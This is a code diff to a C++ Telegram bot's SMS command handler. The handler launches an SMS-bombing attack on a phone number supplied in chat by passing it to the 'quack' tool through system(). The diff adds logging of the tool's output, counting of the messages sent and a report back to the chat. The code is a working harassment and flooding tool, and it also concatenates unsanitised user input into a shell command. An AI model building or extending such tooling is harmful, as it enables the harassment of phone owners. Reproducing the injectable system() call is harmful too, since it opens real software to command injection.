@@ -77,9 +77,24 @@ void Responses::Sms(TgBot::Bot tgbot, TgBot::Message::Ptr message){
 		tgbot.getApi().sendMessage(message->chat->id, "You have to use the following ones: phone number, time, threads");
 	}
 	else{
-    	std::string command = ("quack --tool SMS --target " + parameters[1] + " --time " + parameters[2] + " --threads " + parameters[3]);
+    	std::string command = ("quack --tool SMS --target " + parameters[1] + " --time " + parameters[2] + " --threads " + parameters[3] + " >> data/smsBomb.txt");
     	tgbot.getApi().sendMessage(message->chat->id, "Started SMS bombing...");
 		system(command.c_str());    
+
+		std::vector<std::string> smsOutput;
+		smsOutput = txtToVector("data/smsBomb.txt");
+		// Finds how many messages were sent
+		int smsSent = 0;
+		for(int i=0; i<smsOutput.size(); i++){
+			std::string str = smsOutput[i];
+			str = str[8];
+			if(str=="+"){
+				smsSent++;
+			}
+		}
+		remove("data/smsBomb.txt");
+
+		tgbot.getApi().sendMessage(message->chat->id, std::to_string(smsSent) + " messages sent");
 		tgbot.getApi().sendMessage(message->chat->id, "Bombing completed");
 	}	
 }
